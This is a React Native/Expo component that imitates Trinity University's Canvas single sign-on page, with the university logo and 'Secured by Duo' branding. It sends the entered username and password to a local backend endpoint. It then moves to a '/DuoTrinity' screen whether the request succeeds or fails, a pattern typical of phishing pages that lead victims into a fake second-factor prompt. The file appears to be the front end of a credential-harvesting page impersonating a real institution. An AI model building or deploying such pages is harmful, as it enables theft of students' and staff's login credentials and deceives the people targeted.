import { useState } from "react";
import { Image, TextInput } from 'react-native';
import { useRouter } from 'expo-router';

const styles = {
  body: {
    margin: 0,
    minHeight: "100vh",
    background: "#f0f0f0",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
  },
  card: {
    background: "#fff",
    borderRadius: 16,
    width: 440,
    maxWidth: "95vw",
    overflow: "hidden",
    boxShadow: "0 4px 24px rgba(0,0,0,0.10)",
  },
  topBar: {
    height: 6,
    background: "linear-gradient(90deg, #8C2129 40%, #6e141a 100%)",
  },
  cardBody: {
    padding: "32px 36px 28px 36px",
  },
  logoRow: {
    display: "flex",
    alignItems: "flex-start",
    gap: 10,
    marginBottom: 0,
  },
  trinity: {
    width: 150,
    height: 80,
    marginLeft: -30,
    marginTop: -10,
    marginBottom: -20,
  },
  container: {
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    marginLeft: 20,
    paddingBottom: 28,
  },
  title: {
    fontSize: 22,
    fontWeight: 700,
    color: "black",
    marginBottom: 12,
    marginLeft: 20,
  },
  input: {
    height: 40,
    borderWidth: 1,
    padding: 10,
    borderRadius: 5,
    width: 260,
    marginBottom: 8,
  },
  label: {
    alignSelf: "flex-start",
    marginBottom: 4,
    marginTop: 12,
    fontSize: 14,
  },
  btn: {
    background: "#aba9a2",
    borderColor: "#82817e",
    color: "white",
    width: "70%",
    padding: "12px 0",
    fontSize: 16,
    fontWeight: 600,
    marginBottom: 16,
    display: "block",
    marginLeft: "auto",
    marginRight: "auto",
    borderRadius: 6,
    cursor: "pointer",
  },
  securedText: {
    textAlign: "right",
    fontSize: 12,
    color: "#888",
    margin: "0 16px 16px 0",
  }
};

export default function CanvasTrinity() {
  const router = useRouter();
  const [hoveredBtn, setHoveredBtn] = useState(null);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async () => {
    try {
      const res = await fetch("http://localhost:3000/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.success) {
        router.push('/DuoTrinity');
      }
    } catch (err) {
      router.push('/DuoTrinity');
    }
  };

  return (
    <div style={styles.body}>
      <div style={styles.card}>
        <div style={styles.topBar} />
        <div style={styles.cardBody}>
          <div style={styles.logoRow}>
            <div style={styles.trinity}>
              <Image
                source={require('../../assets/images/trinity-uni-logo.png')}
                style={{ width: 150, height: 80, resizeMode: "contain" }}
              />
            </div>
          </div>
        </div>

        <h2 style={styles.title}>Single Sign-On</h2>

        <div style={styles.container}>
          <p style={styles.label}>Username:</p>
          <TextInput
            style={styles.input}
            placeholder="Username"
            value={username}
            onChangeText={setUsername}
          />
          <p style={styles.label}>Password:</p>
          <TextInput
            style={styles.input}
            placeholder="Password"
            secureTextEntry
            value={password}
            onChangeText={setPassword}
          />
        </div>

        <button
          style={styles.btn}
          onClick={handleLogin}
          onMouseEnter={() => setHoveredBtn("login")}
          onMouseLeave={() => setHoveredBtn(null)}
        >
          Log in to Canvas
        </button>

        <p style={styles.securedText}>Secured by Duo</p>
      </div>
    </div>
  );
}